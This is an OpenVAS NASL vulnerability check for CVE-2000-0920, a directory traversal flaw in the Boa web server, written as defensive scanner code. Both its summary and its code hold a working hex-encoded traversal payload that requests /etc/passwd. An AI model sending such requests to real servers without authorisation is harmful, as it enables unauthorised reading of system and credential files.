# OpenVAS Vulnerability Test
# $Id: httpd_boa.nasl 6702 2017-07-12 13:49:41Z cfischer $
# Description: Boa file retrieval
#
# Authors:
# Thomas Reinke <reinke@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2000 Thomas Reinke
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote Boa server
allows an attacker to read arbitrary files
on the remote web server,  prefixing the
pathname of the file with hex-encoded
../../..
Example:
    GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd 

will return /etc/passwd.";

tag_solution = "upgrade to a later version of the
server found at http://www.boa.org";

if(description)
{
 script_id(10527);
 script_version("$Revision: 6702 $");
 script_tag(name:"last_modification", value:"$Date: 2017-07-12 15:49:41 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1770);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cve_id("CVE-2000-0920");
 
 
 name = "Boa file retrieval";
 script_name(name);
 
 summary = "Boa file retrieval";
 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2000 Thomas Reinke");
 family = "Remote file access";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

 soc = http_open_socket(port);
 if(soc)
 {
  buf = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd");
  buf = http_get(item:buf, port:port);
  send(socket:soc, data:buf);
  rep = http_recv(socket:soc);
  if(("root:" >< rep) && ("Boa/" >< rep) )
  	security_message(port);
  http_close_socket(soc);
 }
